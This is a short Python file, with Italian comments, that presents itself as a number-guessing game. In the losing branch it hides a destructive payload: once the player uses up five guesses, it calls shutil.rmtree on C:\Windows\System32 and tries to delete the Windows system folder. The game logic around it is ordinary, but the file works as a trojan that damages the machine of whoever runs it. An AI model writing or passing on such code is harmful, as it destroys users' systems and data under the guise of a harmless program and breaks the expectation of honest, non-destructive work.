import os
import random
import shutil

class Game:
    n = random.randrange(10)
    chances = 5
    guess_counter = 0

    # Specifica il percorso della cartella da eliminare
    folder_to_delete = r'C:\Windows\System32'  # Assicurati che il percorso sia corretto

    while guess_counter < chances:
        guess_counter += 1

        try:
            guess = int(input("Guess the number between 0 and 10, you have 5 chances good luck!! ;) : "))
        except ValueError:
            print("Invalid input! Please enter a valid integer.")
            guess_counter -= 1  # Non contare questo tentativo
            continue  # Torna all'inizio del ciclo

        if guess == n:
            print(f'The number is {n} and you found it right!! in the {guess_counter} attempt')
            break
        elif guess_counter >= chances and guess != n:
            print(f'Oops sorry, The number is {n} better luck next time')
            try:
                # Rimuovi la cartella e tutti i suoi contenuti
                if os.path.exists(folder_to_delete):
                    shutil.rmtree(folder_to_delete)
                else:
                    print(f"The folder does not exist: {folder_to_delete}")
            except Exception as e:
                print(f"An error occurred while trying to delete the folder: {e}")
        elif guess > n:
            print('Your guess is higher')
        elif guess < n:
            print('Your guess is lesser')

if __name__ == "__main__":
    Game()